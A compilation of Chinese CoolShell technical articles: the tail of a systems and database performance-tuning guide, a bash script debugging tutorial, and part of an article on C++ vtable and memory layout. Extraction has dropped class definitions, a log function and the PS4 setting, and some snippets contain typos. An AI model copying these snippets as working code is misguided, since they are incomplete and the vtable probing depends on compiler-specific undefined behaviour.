这个值就可以更大一些。（顺便说一下，对于某些NB的千光以态网网卡来说，在网卡上，网卡硬件如果发现你的包的大小超过了MTU，其会帮你做fragment，到了目标端又会帮你做重组，这就不需要你在程序中处理了）
再多说一下，使用Socket编程的时候，你可以使用setsockopt() 设置 SO_SNDBUF/SO_RCVBUF 的大小，TTL和KeepAlive这些关键的设置，当然，还有很多，具体你可以查看一下Socket的手册。最后说一点，UDP还有一个最大的好处是multi- cast多播，这个技术对于你需要在内网里通知多台结点时非常方便和高效。而且，多播这种技术对于机会的水平扩展（需要增加机器来侦听多播信息）也很有利。**C）网卡调优******对于网卡，我们也是可以调优的，这对于千兆以及网网卡非常必要，在Linux下，我们可以用ifconfig查看网上的统计信息，如果我们看到overrun上有数据，我们就可能需要调整一下txqueuelen的尺寸（一般默认为1000），我们可以调大一些，如：ifconfig eth0 txqueuelen 5000。Linux下还有一个命令叫：ethtool可以用于设置网卡的缓冲区大小。在Windows下，我们可以在网卡适配器中的高级选项卡中调整相关的参数（如：Receive Buffers, Transmit Buffer等，不同的网卡有不同的参数）。把Buffer调大对于需要大数据量的网络传输非常有效。
**D）其它网络性能**关于多路复用技术，也就是用一个线程来管理所有的TCP链接，有三个系统调用要重点注意：一个是select，这个系统调用只支持上限1024个链接，第二个是poll，其可以突破1024的限制，但是select和poll本质上是使用的轮询机制，轮询机制在链接多的时候性能很差，因主是O(n)的算法，所以，epoll出现了，epoll是操作系统内核支持的，仅当在链接活跃时，操作系统才会callback，这是由操作系统通知触发的，但其只有Linux Kernel 2.6以后才支持（准确说是2.5.44中引入的），当然，如果所有的链接都是活跃的，过多的使用epoll_ctl可能会比轮询的方式还影响性能，不过影响的不大。另外，关于一些和DNS Lookup的系统调用要小心，比如：gethostbyaddr/gethostbyname，这个函数可能会相当的费时，因为其要到网络上去找域名，因为DNS的递归查询，会导致严重超时，而又不能通过设置什么参数来设置time out，对此你可以通过配置hosts文件来加快速度，或是自己在内存中管理对应表，在程序启动时查好，而不要在运行时每次都查。另外，在多线程下面，gethostbyname会一个更严重的问题，就是如果有一个线程的gethostbyname发生阻塞，其它线程都会在gethostbyname处发生阻塞，这个比较变态，要小心。（你可以试试GNU的gethostbyname_r()，这个的性能要好一些） 这种到网上找信息的东西很多，比如，如果你的Linux使用了NIS，或是NFS，某些用户或文件相关的系统调用就很慢，所以要小心。
**4.4）系统调优****A）I/O模型**前面说到过select/poll/epoll这三个系统调用，我们都知道，Unix/Linux下把所有的设备都当成文件来进行I/O，所以，那三个操作更应该算是I/O相关的系统调用。说到 I/O模型，这对于我们的I/O性能相当重要，我们知道，Unix/Linux经典的I/O方式是（关于Linux下的I/O模型，大家可以读一下这篇文章《使用异步I/O大大提高性能》）：第一种，同步阻塞式I/O，这个不说了。第二种，同步无阻塞方式。其通过fctnl设置 O_NONBLOCK 来完成。第三种，对于select/poll/epoll这三个是I/O不阻塞，但是在事件上阻塞，算是：I/O异步，事件同步的调用。第四种，AIO方式。这种I/O 模型是一种处理与 I/O 并行的模型。I/O请求会立即返回，说明请求已经成功发起了。在后台完成I/O操作时，向应用程序发起通知，通知有两种方式：一种是产生一个信号，另一种是执行一个基于线程的回调函数来完成这次 I/O 处理过程。第四种因为没有任何的阻塞，无论是I/O上，还是事件通知上，所以，其可以让你充分地利用CPU，比起第二种同步无阻塞好处就是，第二种要你一遍一遍地去轮询。Nginx之所所以高效，是其使用了epoll和AIO的方式来进行I/O的。
再说一下Windows下的I/O模型，a）一个是WriteFile系统调用，这个系统调用可以是同步阻塞的，也可以是同步无阻塞的，关于看文件是不是以Overlapped打开的。关于同步无阻塞，需要设置其最后一个参数Overlapped，微软叫Overlapped I/O，你需要WaitForSingleObject才能知道有没有写完成。这个系统调用的性能可想而知。b）另一个叫WriteFileEx的系统调用，其可以实现异步I/O，并可以让你传入一个callback函数，等I/O结束后回调之， 但是这个回调的过程Windows是把callback函数放到了APC（Asynchronous Procedure Calls.aspx)）的队列中，然后，只用当应用程序当前线程成为可被通知状态（Alterable）时，才会被回调。只有当你的线程使用了这几个函数时WaitForSingleObjectEx.aspx), WaitForMultipleObjectsEx.aspx), MsgWaitForMultipleObjectsEx.aspx), SignalObjectAndWait.aspx) 和 SleepEx.aspx)，线程才会成为Alterable状态。可见，这个模型，还是有wait，所以性能也不高。
c）然后是IOCP – IO Completion Port，IOCP会把I/O的结果放在一个队列中，但是，侦听这个队列的不是主线程，而是专门来干这个事的一个或多个线程去干（老的平台要你自己创建线程，新的平台是你可以创建一个线程池）。IOCP是一个线程池模型。这个和Linux下的AIO模型比较相似，但是实现方式和使用方式完全不一样。当然，真正提高I/O性能方式是把和外设的I/O的次数降到最低，最好没有，所以，对于读来说，内存cache通常可以从质上提升性能，因为内存比外设快太多了。对于写来说，cache住要写的数据，少写几次，但是cache带来的问题就是实时性的问题，也就是latency会变大，我们需要在写的次数上和相应上做权衡。**B）多核 **CPU** 调优**关于CPU的多核技术，我们知道，CPU0是很关键的，如果0号CPU被用得过狠的话，别的CPU性能也会下降，因为CPU0是有调整功能的，所以，我们不能任由操作系统负载均衡，因为我们自己更了解自己的程序，所以，我们可以手动地为其分配CPU核，而不会过多地占用CPU0，或是让我们关键进程和一堆别的进程挤在一起。* 对于Windows来说，我们可以通过“任务管理器”中的“进程”而中右键菜单中的“设置相关性……”（Set Affinity…）来设置并限制这个进程能被运行在哪些核上。
* 对于Linux来说，可以使用taskset命令来设置（你可以通过安装schedutils来安装这个命令：apt-get install schedutils）多核CPU还有一个技术叫NUMA技术（Non-Uniform Memory Access）。传统的多核运算是使用SMP(Symmetric Multi-Processor )模式，多个处理器共享一个集中的存储器和I/O总线。于是就会出现一致存储器访问的问题，一致性通常意味着性能问题。NUMA模式下，处理器被划分成多个node， 每个node有自己的本地存储器空间。关于NUMA的一些技术细节，你可以查看一下这篇文章《Linux 的 NUMA 技术》，在Linux下，对NUMA调优的命令是： **numactl** 。如下面的命令：（指定命令“myprogram arg1 arg2”运行在node 0 上，其内存分配在node 0 和 1上）`numactl --cpubind=0 --membind=0,1 myprogram arg1 arg2`当然，上面这个命令并不好，因为内存跨越了两个node，这非常不好。最好的方式是只让程序访问和自己运行一样的node，如：
`$ numactl --membind 1 --cpunodebind 1 --localalloc myapplication`**C）文件系统调优**关于文件系统，因为文件系统也是有cache的，所以，为了让文件系统有最大的性能。首要的事情就是分配足够大的内存，这个非常关键，在Linux下可以使用free命令来查看 free/used/buffers/cached，理想来说，buffers和cached应该有40%左右。然后是一个快速的硬盘控制器，SCSI会好很多。最快的是Intel SSD 固态硬盘，速度超快，但是写次数有限。接下来，我们就可以调优文件系统配置了，对于Linux的Ext3/4来说，几乎在所有情况下都有所帮助的一个参数是关闭文件系统访问时间，在/etc/fstab下看看你的文件系统 有没有noatime参数（一般来说应该有），还有一个是dealloc，它可以让系统在最后时刻决定写入文件发生时使用哪个块，可优化这个写入程序。还要注间一下三种日志模式：data=journal、data=ordered和data=writeback。默认设置data=ordered提供性能和防护之间的最佳平衡。
当然，对于这些来说，ext4的默认设置基本上是最佳优化了。这里介绍一个Linux下的查看I/O的命令—— iotop，可以让你看到各进程的磁盘读写的负载情况。其它还有一些关于NFS、XFS的调优，大家可以上google搜索一些相关优化的文章看看。关于各文件系统，大家可以看一下这篇文章——《Linux日志文件系统及性能分析》**4.5）数据库调优**数据库调优并不是我的强项，我就仅用我非常有限的知识说上一些吧。注意，下面的这些东西并不一定正确，因为在不同的业务场景，不同的数据库设计下可能会得到完全相反的结论，所以，我仅在这里做一些一般性的说明，具体问题还要具体分析。**A）数据库引擎调优**我对数据库引擎不是熟，但是有几个事情我觉得是一定要去了解的。* **数据库的锁的方式** 。这个非常非常地重要。并发情况下，锁是非常非常影响性能的。各种隔离级别，行锁，表锁，页锁，读写锁，事务锁，以及各种写优先还是读优先机制。性能最高的是不要锁，所以，分库分表，冗余数据，减少一致性事务处理，可以有效地提高性能。NoSQL就是牺牲了一致性和事务处理，并冗余数据，从而达到了分布式和高性能。   * **数据库的存储机制** 。不但要搞清楚各种类型字段是怎么存储的，更重要的是数据库的数据存储方式，是怎么分区的，是怎么管理的，比如Oracle的数据文件，表空间，段，等等。了解清楚这个机制可以减轻很多的I/O负载。比如：MySQL下使用show engines;可以看到各种存储引擎的支持。不同的存储引擎有不同的侧重点，针对不同的业务或数据库设计会让你有不同的性能。   * **数据库的分布式策略** 。最简单的就是复制或镜像，需要了解分布式的一致性算法，或是主主同步，主从同步。通过了解这种技术的机理可以做到数据库级别的水平扩展。
**B）SQL语句优化**关于SQL语句的优化，首先也是要使用工具，比如：MySQL SQL Query Analyzer，Oracle SQL Performance Analyzer，或是微软SQL Query Analyzer.aspx)，基本上来说，所有的RMDB都会有这样的工具，来让你查看你的应用中的SQL的性能问题。 还可以使用explain来看看SQL语句最终Execution Plan会是什么样的。还有一点很重要，数据库的各种操作需要大量的内存，所以服务器的内存要够，优其应对那些多表查询的SQL语句，那是相当的耗内存。下面我根据我有限的数据库SQL的知识说几个会有性能问题的SQL：* **全表检索** 。比如：select * from user where lastname = “xxxx”，这样的SQL语句基本上是全表查找，线性复杂度O(n)，记录数越多，性能也越差（如：100条记录的查找要50ms，一百万条记录需要5分钟）。对于这种情况，我们可以有两种方法提高性能：一种方法是分表，把记录数降下来，另一种方法是建索引（为lastname建索引）。索引就像是key-value的数据结构一样，key就是where后面的字段，value就是物理行号，对索引的搜索复杂度是基本上是O(log(n)) ——用B-Tree实现索引（如：100条记录的查找要50ms，一百万条记录需要100ms）。
* **索引** 。对于索引字段，最好不要在字段上做计算、类型转换、函数、空值判断、字段连接操作，这些操作都会破坏索引原本的性能。当然，索引一般都出现在Where或是Order by字句中，所以对Where和Order by子句中的子段最好不要进行计算操作，或是加上什么NOT之类的，或是使用什么函数。* **多表查询** 。关系型数据库最多的操作就是多表查询，多表查询主要有三个关键字，EXISTS，IN和JOIN（关于各种join，可以参看图解SQL的Join一文）。基本来说，现代的数据引擎对SQL语句优化得都挺好的，JOIN和IN/EXISTS在结果上有些不同，但性能基本上都差不多。有人说，EXISTS的性能要好于IN，IN的性能要好于JOIN，我各人觉得，这个还要看你的数据、schema和SQL语句的复杂度，对于一般的简单的情况来说，都差不多，所以千万不要使用过多的嵌套，千万不要让你的SQL太复杂，宁可使用几个简单的SQL也不要使用一个巨大无比的嵌套N级的SQL。还有人说，如果两个表的数据量差不多，Exists的性能可能会高于In，In可能会高于Join，如果这两个表一大一小，那么子查询中，Exists用大表，In则用小表。这个，我没有验证过，放在这里让大家讨论吧。另，有一篇关于SQL Server的文章大家可以看看《IN vs JOIN vs EXISTS》
* **JOIN操作** 。有人说，Join表的顺序会影响性能，只要Join的结果集是一样，性能和join的次序无关。因为后台的数据库引擎会帮我们优化的。Join有三种实现算法，嵌套循环，排序归并，和Hash式的Join。（MySQL只支持第一种）* 嵌套循环，就好像是我们常见的多重嵌套循环。注意，前面的索引说过，数据库的索引查找算法用的是B-Tree，这是O(log(n))的算法，所以，整个算法复法度应该是O(log(n)) * O(log(m)) 这样的。     * Hash式的Join，主要解决嵌套循环的O(log(n))的复杂，使用一个临时的hash表来标记。     * 排序归并，意思是两个表按照查询字段排好序，然后再合并。当然，索引字段一般是排好序的。还是那句话，具体要看什么样的数据，什么样的SQL语句，你才知道用哪种方法是最好的。* **部分结果集。** 我们知道MySQL里的Limit关键字，Oracle里的rownum，SQL Server里的Top都是在限制前几条的返回结果。这给了我们数据库引擎很多可以调优的空间。一般来说，返回top n的记录数据需要我们使用order by，注意在这里我们需要为order by的字段建立索引。有了被建索引的order by后，会让我们的select语句的性能不会被记录数的所影响。使用这个技术，一般来说我们前台会以分页方式来显现数据，Mysql用的是OFFSET，SQL Server用的是FETCH NEXT，这种Fetch的方式其实并不好是线性复杂度，所以，如果我们能够知道order by字段的第二页的起始值，我们就可以在where语句里直接使用>=的表达式来select，这种技术叫seek，而不是fetch，seek的性能比fetch要高很多。
* **字符串** 。正如我前面所说的，字符串操作对性能上有非常大的恶梦，所以，能用数据的情况就用数字，比如：时间，工号，等。* **全文检索** 。千万不要用Like之类的东西来做全文检索，如果要玩全文检索，可以尝试使用Sphinx。* **其它** 。      * 不要select *，而是明确指出各个字段，如果有多个表，一定要在字段名前加上表名，不要让引擎去算。     * 不要用Having，因为其要遍历所有的记录。性能差得不能再差。     * 尽可能地使用UNION ALL 取代 UNION。     * 索引过多，insert和delete就会越慢。而update如果update多数索引，也会慢，但是如果只update一个，则只会影响一个索引表。     * 等等。关于SQL语句的优化，网上有很多文章， 不同的数据库引擎有不同的优化技巧，正如本站以前转发的《MySQL性能优化的最佳20+条经验》先写这么多吧，欢迎大家指正补充。> **注：** > 这篇文章的确是个大杂烩。其实其中的说到的很多技术在网上都有很多很多的技术文章，google一下就能找到一堆有很多细节的文章，所以我也就不写了。这篇性能调优的文章写作的动机是之前看到 > @淘宝褚霸 > 强推的highscalability.com上的这篇文章：Big List Of 20 > Common Bottlenecks，觉得这篇文章泛泛而谈，觉得自己能写得比它好，所以就产生了动机。
（ **转载时请注明作者和出处，请勿用于商业用途** ）# 如何调试bash脚本作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!如何调试Bash脚本Bash 是Linux操作系统的默认Shell脚本。Shell是用来处理操作系统和用户交互的一个程序。Shell的脚本可以帮助用户自动化地和操作系统进行交互。你也可以理解为一种脚本式的编程。即然有编程，那么，程序的编译器，解释器，调试器就必不可少了，Bash也一样，但在调试方面可能会有一些和编程语言不一样的东西和技术，所以，下面这篇文章主要是说明调试bash脚本的各种技术。#### 跟踪脚本的执行你可以让bash打印出你脚本执行的过程中的所有语句。这很简单，只需要使用bash的-x选项就可以做到，下面让我们来看一下。下面的这段脚本，先是输出一个问候语句，然后输出当前的时间：#!/bin/bash     echo "Hello $USER,"     echo "Today is $(date +'%Y-%m-%d')"下面让我们使用-x选项来运行这段脚本：$ bash -x example_script.sh     + echo 'Hello chenhao,'     Hello chenhao,     ++ date +%Y-%m-%d     + echo 'Today is 2009-08-31'     Today is 2009-08-31
这时，我们可以看到，bash在运行前打印出了每一行命令。而且每行前面的+号表明了嵌套。这样的输出可以让你看到命令执行的顺序并可以让你知道整个脚本的行为。   **在跟踪里输出行号**在一个很大的脚本中，你会看到很多很多的执行跟踪的输出，阅读起来非常费劲，所以，你可以在每一行前加上文件的行号，这会非常有用。要做到这样，你只需要设置下面的环境变量：让我们看看设置上了PS4这个环境变量后会是什么样的输出。$ bash -x example_script.sh     +example_script.sh:2:: echo 'Hello chenhao,'     Hello chenhao,     ++example_script.sh:3:: date +%Y-%m-%d     +example_script.sh:3:: echo 'Today is 2009-08-31'     Today is 2009-08-31**调试部份的脚本**有些时候，你并不想调试整个脚本，你只要调试其中的一部份，那么，你可以在你想要调试的脚本之前，调用“set -x”，结束的时候调用“set +x”就可以了。如下面的脚本所示：
#!/bin/bash     echo "Hello $USER,"     set -x     echo "Today is $(date %Y-%m-%d)"     set +x让我们看看运行起来是啥样？$ ./example_script.sh     Hello chenhao,     ++example_script.sh:4:: date +%Y-%m-%d     +example_script.sh:4:: echo 'Today is 2009-08-31'     Today is 2009-08-31     +example_script.sh:5:: set +x注意：我们在运行脚本的时候，不需要使用bash -x了。#### 日志输出跟踪日志有时候太多了，多得都受不了，而且，输出的内容很难阅读。一般来说，我们很多时候只关心于条件表达式，变量值，或是函数调用，或是循环等。。在这种情况下，log一些感兴趣的特定的信息，可能会更好。使用log前，我们先写一个函数：于是，你就可以在你的脚本中如下使用：_log "Copying files..."     cp src/* dst/
我们可以看到，上面那个_log函数，需要检查一个_DEBUG 变量，只有这个变量是真，才会真正开发输出日志。这样，你就只需要控制这个开关，而不需要删除你的debug信息。$ _DEBUG=true ./example_script.sh#### 使用Bash专用调试器如果你在写一个相当复杂的脚本，并且，你需要一个完整的像调试别的语言一样的调试器，那么你可以试着用用这个开源软件—— bashdb， 一个Bash的专用调试器。这个调试器很强大，你想得到的功能，他都有，比如，设置断点，单步跟踪，跳出函数，等等。它的用户接口很想GDB，这是他的文档 。（全文完）# C++ 对象的内存布局作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn07年12月，我写了一篇《C++虚函数表解析》的文章，引起了大家的兴趣。有很多朋友对我的文章留了言，有鼓励我的，有批评我的，还有很多问问题的。我在这里一并对大家的留言表示感谢。这也是我为什么再写一篇续言的原因。因为，在上一篇文章中，我用了的示例都是非常简单的，主要是为了说明一些机理上的问题，也是为了图一些表达上方便和简单。不想，这篇文章成为了打开C++对象模型内存布局的一个引子，引发了大家对C++对象的更深层次的讨论。当然，我之前的文章还有很多方面没有涉及，从我个人感觉下来，在谈论虚函数表里，至少有以下这些内容没有涉及：
1）有成员变量的情况。2）有重复继承的情况。3）有虚拟继承的情况。4）有钻石型虚拟继承的情况。这些都是我本篇文章需要向大家说明的东西。所以，这篇文章将会是《C++虚函数表解析》的一个续篇，也是一篇高级进阶的文章。我希望大家在读这篇文章之前对C++有一定的基础和了解，并能先读我的上一篇文章。因为这篇文章的深度可能会比较深，而且会比较杂乱，我希望你在读本篇文章时不会有大脑思维紊乱导致大脑死机的情况。;-)目录* 对象的影响因素   * 知识复习   * 单一的一般继承   * 多重继承   * 重复继承   * 钻石型多重虚拟继承   * 结束语#### 对象的影响因素简而言之，我们一个类可能会有如下的影响因素：1）成员变量2）虚函数（产生虚函数表）3）单一继承（只继承于一个类）4）多重继承（继承多个类）5）重复继承（继承的多个父类中其父类有相同的超类）6）虚拟继承（使用virtual方式继承，为了保证继承后父类的内存布局只会存在一份）上述的东西通常是C++这门语言在语义方面对对象内部的影响因素，当然，还会有编译器的影响（比如优化），还有字节对齐的影响。在这里我们都不讨论，我们只讨论C++语言上的影响。
本篇文章着重讨论下述几个情况下的C++对象的内存布局情况。1） **单一的一般继承** （带成员变量、虚函数、虚函数覆盖）2） **单一的虚拟继承** （带成员变量、虚函数、虚函数覆盖）3） **多重继承** （带成员变量、虚函数、虚函数覆盖）4） **重复多重继承** （带成员变量、虚函数、虚函数覆盖）5） **钻石型的虚拟多重继承** （带成员变量、虚函数、虚函数覆盖）我们的目标就是，让事情越来越复杂。#### 知识复习我们简单地复习一下，我们可以通过对象的地址来取得虚函数表的地址，如：typedef void(*Fun)(void);Base b;Fun pFun = NULL;cout << "虚函数表地址：" << (int*)(&b) << endl;     cout << "虚函数表 — 第一个函数地址：" << (int*)*(int*)(&b) << endl;// Invoke the first virtual function     pFun = (Fun)*((int*)*(int*)(&b));     pFun();我们同样可以用这种方式来取得整个对象实例的内存布局。因为这些东西在内存中都是连续分布的，我们只需要使用适当的地址偏移量，我们就可以获得整个内存对象的布局。
本篇文章中的例程或内存布局主要使用如下编译器和系统：**1）Windows XP 和 VC++ 2003**   **2）Cygwin 和 G++ 3.4.4**#### 单一的一般继承下面，我们假设有如下所示的一个继承关系：!01请注意，在这个继承关系中，父类，子类，孙子类都有自己的一个成员变量。而了类覆盖了父类的f()方法，孙子类覆盖了子类的g_child()及其超类的f()。我们的源程序如下所示：};我们使用以下程序作为测试程序：（下面程序中，我使用了一个int** pVtab 来作为遍历对象内存布局的指针，这样，我就可以方便地像使用数组一样来遍历所有的成员包括其虚函数表了，在后面的程序中，我也是用这样的方法的，请不必感到奇怪，）typedef void(*Fun)(void);GrandChild gc;int** pVtab = (int**)&gc;其运行结果如下所示：（在VC++ 2003和G++ 3.4.4下）[0] GrandChild::_vptr->     <pre>    [0] GrandChild::f()     [1] Parent::g()     [2] Parent::h()     [3] GrandChild::g_child()     [4] Child::h1()     [5] GrandChild::h_grandchild()     [1] Parent.iparent = 10     [2] Child.ichild = 100     [3] GrandChild.igrandchild = 1000
使用图片表示如下：!02可见以下几个方面：1）虚函数表在最前面的位置。2）成员变量根据其继承和声明顺序依次放在后面。3）在单一的继承中，被overwrite的虚函数在虚函数表中得到了更新。#### 多重继承下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类只overwrite了父类的f()函数，而还有一个是自己的函数（我们这样做的目的是为了用g1()作为一个标记来标明子类的虚函数表）。而且每个类中都有一个自己的成员变量：!03我们的类继承的源代码如下所示：父类的成员初始为10，20，30，子类的为100};我们通过下面的程序来查看子类实例的内存布局：下面程序中，注意我使用了一个s变量，其中用到了sizof(Base)来找下一个类的偏移量。（因为我声明的是int成员，所以是4个字节，所以没有对齐问题。关于内存的对齐问题，大家可以自行试验，我在这里就不多说了）typedef void(*Fun)(void);Derive d;int** pVtab = (int**)&d;cout << "[0] Base1::_vptr->" << endl;     pFun = (Fun)pVtab[0][0];     cout << "     [0] ";     pFun();
pFun = (Fun)pVtab[0][1];     cout << "     [1] ";pFun();pFun = (Fun)pVtab[0][2];     cout << "     [2] ";pFun();pFun = (Fun)pVtab[0][3];     cout << "     [3] "; pFun();pFun = (Fun)pVtab[0][4];     cout << "     [4] "; cout<<pFun<<endl;cout << "[1] Base1.ibase1 = " << (int)pVtab[1] << endl;int s = sizeof(Base1)/4;cout << "[" << s << "] Base2::_vptr->"<<endl;     pFun = (Fun)pVtab[s][0];     cout << "     [0] "; pFun();Fun = (Fun)pVtab[s][1];     cout << "     [1] "; pFun();pFun = (Fun)pVtab[s][2];     cout << "     [2] "; pFun();
pFun = (Fun)pVtab[s][3];     out << "     [3] ";     cout<<pFun<<endl;cout << "["<< s+1 <<"] Base2.ibase2 = " << (int)pVtab[s+1] << endl;s = s + sizeof(Base2)/4;cout << "[" << s << "] Base3::_vptr->"<<endl;     pFun = (Fun)pVtab[s][0];     cout << "     [0] "; pFun();pFun = (Fun)pVtab[s][1];     cout << "     [1] "; pFun();pFun = (Fun)pVtab[s][2];     cout << "     [2] "; pFun();pFun = (Fun)pVtab[s][3];     cout << "     [3] ";     cout<<pFun<<endl;s++;     cout << "["<< s <<"] Base3.ibase3 = " << (int)pVtab[s] << endl;     s++;     cout << "["<< s <<"] Derive.iderive = " << (int)pVtab[s] << endl;
其运行结果如下所示：（在VC++ 2003和G++ 3.4.4下）[0] Base1::_vptr->     [0] Derive::f()     [1] Base1::g()     [2] Base1::h()     [3] Driver::g1()     [4] 00000000      <== 注意：在GCC下，这里是1     [1] Base1.ibase1 = 10     [2] Base2::_vptr->     [0] Derive::f()     [1] Base2::g()     [2] Base2::h()     [3] 00000000      <== 注意：在GCC下，这里是1     [3] Base2.ibase2 = 20     [4] Base3::_vptr->     [0] Derive::f()     [1] Base3::g()     [2] Base3::h()     [3] 00000000     [5] Base3.ibase3 = 30     [6] Derive.iderive = 100使用图片表示是下面这个样子：
!04我们可以看到：1） 每个父类都有自己的虚表。2） 子类的成员函数被放到了第一个父类的表中。3） 内存布局中，其父类布局依次按声明顺序排列。4） 每个父类的虚表中的f()函数都被overwrite成了子类的f()。这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。#### 重复继承下面我们再来看看，发生重复继承的情况。所谓重复继承，也就是某个基类被间接地重复继承了多次。下图是一个继承图，我们重载了父类的f()函数。!05其类继承的源代码如下所示。其中，每个类都有两个变量，一个是整形（4字节），一个是字符（1字节），而且还有自己的虚函数，自己overwrite父类的虚函数。如子类D中，f()覆盖了超类的函数， f1() 和f2() 覆盖了其父类的虚函数，Df()为自己的虚函数。};};我们用来存取子类内存布局的代码如下所示：（在VC++ 2003和G++ 3.4.4下）typedef void(*Fun)(void);     int** pVtab = NULL;     Fun pFun = NULL;D d;     pVtab = (int**)&d;     cout << "[0] D::B1::_vptr->" << endl;     pFun = (Fun)pVtab[0][0];     cout << "     [0] ";    pFun();     pFun = (Fun)pVtab[0][1];     cout << "     [1] ";    pFun();     pFun = (Fun)pVtab[0][2];     cout << "     [2] ";    pFun();     pFun = (Fun)pVtab[0][3];     cout << "     [3] ";    pFun();     pFun = (Fun)pVtab[0][4];     cout << "     [4] ";    pFun();     pFun = (Fun)pVtab[0][5];     cout << "     [5] 0x" << pFun << endl;
cout << "[1] B::ib = " << (int)pVtab[1] << endl;     cout << "[2] B::cb = " << (char)pVtab[2] << endl;     cout << "[3] B1::ib1 = " << (int)pVtab[3] << endl;     cout << "[4] B1::cb1 = " << (char)pVtab[4] << endl;cout << "[5] D::B2::_vptr->" << endl;     pFun = (Fun)pVtab[5][0];     cout << "     [0] ";    pFun();     pFun = (Fun)pVtab[5][1];     cout << "     [1] ";    pFun();     pFun = (Fun)pVtab[5][2];     cout << "     [2] ";    pFun();     pFun = (Fun)pVtab[5][3];     cout << "     [3] ";    pFun();     pFun = (Fun)pVtab[5][4];     cout << "     [4] 0x" << pFun << endl;
cout << "[6] B::ib = " << (int)pVtab[6] << endl;     cout << "[7] B::cb = " << (char)pVtab[7] << endl;     cout << "[8] B2::ib2 = " << (int)pVtab[8] << endl;     cout << "[9] B2::cb2 = " << (char)pVtab[9] << endl;cout << "[10] D::id = " << (int)pVtab[10] << endl;     cout << "[11] D::cd = " << (char)pVtab[11] << endl;程序运行结果如下：!06下面是对于子类实例中的虚函数表的图：!06我们可以看见，最顶端的父类B其成员变量存在于B1和B2中，并被D给继承下去了。而在D中，其有B1和B2的实例，于是B的成员在D的实例中存在两份，一份是B1继承而来的，另一份是B2继承而来的。所以，如果我们使用以下语句，则会产生二义性编译错误：D d;   d.ib = 0; //二义性错误   d.B1::ib = 1; //正确   d.B2::ib = 2; //正确
注意，上面例程中的最后两条语句存取的是两个变量。虽然我们消除了二义性的编译错误，但B类在D中还是有两个实例，这种继承造成了数据的重复，我们叫这种继承为重复继承。重复的基类数据成员可能并不是我们想要的。所以，C++引入了虚基类的概念。#### 钻石型多重虚拟继承虚拟继承的出现就是为了解决重复继承中多个间接父类的问题的。钻石型的结构是其最经典的结构。也是我们在这里要讨论的结构：!07上述的“重复继承”只需要把B1和B2继承B的语法中加上virtual 关键，就成了虚拟继承，其继承图如下所示：上图和前面的“重复继承”中的类的内部数据和接口都是完全一样的，只是我们采用了虚拟继承：其省略后的源码如下所示：class B {……};     class B1 : virtual public B{……};     class B2: virtual public B{……};     class D : public B1, public B2{ …… };在查看D之前，我们先看一看单一虚拟继承的情况。下面是一段在VC++2003下的测试程序：（因为VC++和GCC的内存而局上有一些细节上的不同，所以这里只给出VC++的程序，GCC下的程序大家可以根据我给出的程序自己仿照着写一个去试一试）：
int** pVtab = NULL;     Fun pFun = NULL;B1 bb1;pVtab = (int**)&bb1;     cout << "[0] B1::_vptr->" << endl;     pFun = (Fun)pVtab[0][0];     cout << "     [0] ";     pFun(); //B1::f1();     cout << "     [1] ";     pFun = (Fun)pVtab[0][1];     pFun(); //B1::bf1();     cout << "     [2] ";     cout << pVtab[0][2] << endl;cout << "[1] = 0x";     cout << (int*)*((int*)(&bb1)+1) <<endl; //B1::ib1     cout << "[2] B1::ib1 = ";     cout << (int)*((int*)(&bb1)+2) <<endl; //B1::ib1     cout << "[3] B1::cb1 = ";     cout << (char)*((int*)(&bb1)+3) << endl; //B1::cb1
cout << "[4] = 0x";     cout << (int*)*((int*)(&bb1)+4) << endl; //NULLcout << "[5] B::_vptr->" << endl;     pFun = (Fun)pVtab[5][0];     cout << "     [0] ";     pFun(); //B1::f();     pFun = (Fun)pVtab[5][1];     cout << "     [1] ";     pFun(); //B::Bf();     cout << "     [2] ";     cout << "0x" << (Fun)pVtab[5][2] << endl;cout << "[6] B::ib = ";     cout << (int)*((int*)(&bb1)+6) <<endl; //B::ib     cout << "[7] B::cb = ";其运行结果如下（我结出了GCC的和VC++2003的对比）：!070这里，大家可以自己对比一下。关于细节上，我会在后面一并再说。下面的测试程序是看子类D的内存布局，同样是VC++ 2003的（因为VC++和GCC的内存布局上有一些细节上的不同，而VC++的相对要清楚很多，所以这里只给出VC++的程序，GCC下的程序大家可以根据我给出的程序自己仿照着写一个去试一试）：
D d;pVtab = (int**)&d;     cout << "[0] D::B1::_vptr->" << endl;     pFun = (Fun)pVtab[0][0];     cout << "     [0] ";    pFun(); //D::f1();     pFun = (Fun)pVtab[0][1];     cout << "     [1] ";    pFun(); //B1::Bf1();     pFun = (Fun)pVtab[0][2];     cout << "     [2] ";    pFun(); //D::Df();     pFun = (Fun)pVtab[0][3];     cout << "     [3] ";     cout << pFun << endl;//cout << pVtab[4][2] << endl;     cout << "[1] = 0x";     cout <<  (int*)((&dd)+1) <<endl; //????cout << "[2] B1::ib1 = ";     cout << *((int*)(&dd)+2) <<endl; //B1::ib1     cout << "[3] B1::cb1 = ";     cout << (char)*((int*)(&dd)+3) << endl; //B1::cb1
//---------------------     cout << "[4] D::B2::_vptr->" << endl;     pFun = (Fun)pVtab[4][0];     cout << "     [0] ";    pFun(); //D::f2();     pFun = (Fun)pVtab[4][1];     cout << "     [1] ";    pFun(); //B2::Bf2();     pFun = (Fun)pVtab[4][2];     cout << "     [2] ";     cout << pFun << endl;cout << "[5] = 0x";     cout << *((int*)(&dd)+5) << endl; // ???cout << "[6] B2::ib2 = ";     cout << (int)*((int*)(&dd)+6) <<endl; //B2::ib2     cout << "[7] B2::cb2 = ";     cout << (char)*((int*)(&dd)+7) << endl; //B2::cb2
cout << "[8] D::id = ";     cout << *((int*)(&dd)+8) << endl; //D::id     cout << "[9] D::cd = ";     cout << (char)*((int*)(&dd)+9) << endl;//D::cdcout << "[10]  = 0x";     cout << (int*)*((int*)(&dd)+10) << endl;     //---------------------     cout << "[11] D::B::_vptr->" << endl;     pFun = (Fun)pVtab[11][0];     cout << "     [0] ";    pFun(); //D::f();     pFun = (Fun)pVtab[11][1];     cout << "     [1] ";    pFun(); //B::Bf();     pFun = (Fun)pVtab[11][2];     cout << "     [2] ";     cout << pFun << endl;
